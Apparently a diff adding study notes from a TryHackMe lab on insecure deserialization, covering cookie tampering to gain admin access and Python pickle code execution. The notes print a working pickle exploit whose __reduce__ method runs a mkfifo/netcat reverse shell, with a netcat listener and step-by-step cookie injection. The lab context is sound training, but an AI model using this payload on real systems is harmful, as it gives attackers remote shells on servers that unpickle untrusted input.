@@ -207,4 +207,62 @@ Serialisation is the process of converting objects used in programming into simp
 Alternatively, deserialisation is the reverse of this; converting serialised information into their complex form - an object that the application will understand.
 
 
+Insecure Deserialization - Cookies 
+"Expiry" timer is set when the cookie is created.
+cookie attributes:
+Cookie Name , Cookie Value , Secure Only (cookie only set over HTTPS) , Expiry (timestamp) , Path (cookie sent only if specified URL is within request)
+creating cookies: in python's flask
+dateTime=datetime.now()
+timestamp=str(dateTime)
+resp.set_cookie("registrationTimestamp", timestamp)
+
+Insecure Deserialization - Cookies Practical 
+cookies are both plaintext encoded and base64 encoded.decode to find the flag
+change the "Value" column of "userType" to "admin".got to website/admin to find the flag
+
+Insecure Deserialization - Code Execution 
+cookie={"replaceme":payload}
+pickle_payload=pickle.dumps(cookie)
+encodedPayloadCookie=base64.b64encode(pickle_payload)
+resp=make_response(redirect("/myprofile"))
+resp.set_cookie("encodedPayload", encodedPayloadCookie)
+
+how the cookie is retrieved and then deserialized via pickle.loads
+cookie=request.cookies.get("encodedPayload")
+cookie=pickle.loads(base64.b64decode(cookie))
+
+This vulnerability exploits Python Pickle. We essentially have free reign to execute whatever we like such as a reverse shell.
+Because the code being deserialized is from a base64 format, we cannot just simply spawn a reverse shell. We must encode our own commands in base64 so that the malicious code will be executed.
+First, we need to set up a netcat listener on our Kali.
+nc -lvnp 4444    (command)
+Once this is complete, copy-and-paste the source code from this Github page to your kali and modify the source code to replace your "YOUR_TRYHACKME_VPN_IP" with your TryHackMe VPN IP. This can be obtained via the Access page.
+https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3
+
+import pickle
+import sys
+import base64
+
+command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'
+
+class rce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
+
+print(base64.b64encode(pickle.dumps(rce())))
+
+1. Create a python file to paste into, I have used "rce.py" for these examples:
+2. Paste the code from the GitHub site, replacing YOUR_TRYHACKME_VPN_IP with your TryHackMe VPN IP from the access page
+3. Execute "rce.py" via python3 rce.py
+4. Note the output of the command
+5.Copy and paste everything in-between the two speech marks ('DATA')
+6. Paste this into the "encodedPayload" cookie in your browser:
+7. Ensure our netcat listener is still running:
+8. Refresh the page. It will hang, refer back to your netcat listener:
+If you have performed the steps correctly, you will now have a remote shell to your instance. No privilege escalation involved, look for the flag.txt flag!
+
+find / | grep flag.txt    (to find the flag)
+
+
+
 
